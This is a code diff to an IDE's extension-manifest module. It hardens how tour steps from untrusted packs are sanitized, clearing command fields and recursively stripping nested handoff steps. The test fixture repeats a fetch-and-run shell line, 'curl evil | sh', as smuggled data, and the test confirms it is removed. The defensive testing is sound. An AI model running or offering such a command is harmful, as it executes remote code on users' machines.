@@ -427,8 +427,9 @@ pub struct TourStepSpec {
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub align: Option<String>,
     /// `handoff`: the command or URL offered for copying. Never executed — the
-    /// console renders it as inert text, and `visible_tours` strips handoff
-    /// steps from untrusted packs so this never reaches the client for one.
+    /// console renders it as inert text, and for an untrusted pack
+    /// `sanitize_untrusted_step` drops handoff steps and clears this field on any
+    /// surviving step, so an untrusted pack's command never reaches the client.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub copy: Option<String>,
     #[serde(default, skip_serializing_if = "Option::is_none")]
@@ -470,7 +471,8 @@ pub struct TourSpec {
     pub success_when: Option<TourGate>,
 }
 
-/// Remove `handoff` steps from an untrusted pack's tours.
+/// Remove everything an untrusted pack must not put in front of a user as a
+/// trustworthy command, recursively.
 ///
 /// A handoff's `copy` is a command the console invites the user to paste into a
 /// shell. Nothing is ever executed by the console — the runner renders it with
@@ -493,8 +495,8 @@ pub fn visible_tours(m: &ExtManifest) -> Vec<TourSpec> {
             let steps: Vec<TourStepSpec> = t
                 .steps
                 .iter()
-                .filter(|s| s.kind != TourStepKind::Handoff)
                 .cloned()
+                .filter_map(sanitize_untrusted_step)
                 .collect();
             if steps.is_empty() {
                 return None;
@@ -502,6 +504,31 @@ pub fn visible_tours(m: &ExtManifest) -> Vec<TourSpec> {
             Some(TourSpec { steps, ..t.clone() })
         })
         .collect()
+}
+
+/// Sanitize one step from an untrusted pack, recursively.
+///
+/// The trust posture is that an untrusted pack's *command string never reaches
+/// the client at all* — so it is not enough to drop top-level `handoff` steps:
+///
+/// - A `handoff` step is dropped whole (`None`) wherever it appears.
+/// - A surviving `note`/`spotlight` step has its handoff-only fields (`copy`,
+///   `copy_label`, `verify_polling_job_type`) cleared, because a non-handoff kind
+///   carrying a `copy` string is exactly the smuggling path the gate must close.
+/// - The `repair` substitution is a full step the console will render in place of
+///   this one, so it is sanitized by the same rules; a `repair` that was a
+///   handoff is removed, leaving the parent without a substitution.
+fn sanitize_untrusted_step(mut s: TourStepSpec) -> Option<TourStepSpec> {
+    if s.kind == TourStepKind::Handoff {
+        return None;
+    }
+    s.copy = None;
+    s.copy_label = None;
+    s.verify_polling_job_type = None;
+    s.repair = s
+        .repair
+        .and_then(|r| sanitize_untrusted_step(*r).map(Box::new));
+    Some(s)
 }
 
 /// The `nano-ide.ext.json` manifest, read as data.
@@ -1999,7 +2026,11 @@ mod tests {
               "id": "community-pack", "kind": "app", "displayName": "Community",
               "tours": [
                 { "id": "mixed", "title": "T", "blurb": "B", "steps": [
-                    { "id": "look", "kind": "note", "title": "T", "body": "B" },
+                    { "id": "look", "kind": "note", "title": "T", "body": "B",
+                      "copy": "curl evil | sh", "copyLabel": "Run",
+                      "verifyPollingJobType": "x",
+                      "repair": { "id": "smuggle", "kind": "handoff", "title": "T",
+                                  "body": "B", "copy": "curl evil | sh" } },
                     { "id": "paste", "kind": "handoff", "title": "T", "body": "B", "copy": "curl evil | sh" }
                 ]},
                 { "id": "all-handoff", "title": "T", "blurb": "B", "steps": [
@@ -2016,7 +2047,18 @@ mod tests {
         assert_eq!(visible.len(), 1, "the all-handoff journey must be dropped");
         assert_eq!(visible[0].id, "mixed");
         assert_eq!(visible[0].steps.len(), 1);
-        assert_eq!(visible[0].steps[0].id, "look");
+        let look = &visible[0].steps[0];
+        assert_eq!(look.id, "look");
+        // A surviving non-handoff step must not carry any handoff-only field, and
+        // its `repair` (a nested handoff here) must be stripped — otherwise an
+        // untrusted pack could smuggle a command past the gate either way.
+        assert_eq!(look.copy, None, "copy must be cleared on a surviving step");
+        assert_eq!(look.copy_label, None);
+        assert_eq!(look.verify_polling_job_type, None);
+        assert!(
+            look.repair.is_none(),
+            "a nested handoff repair must be stripped"
+        );
         assert!(
             !visible[0]
                 .steps
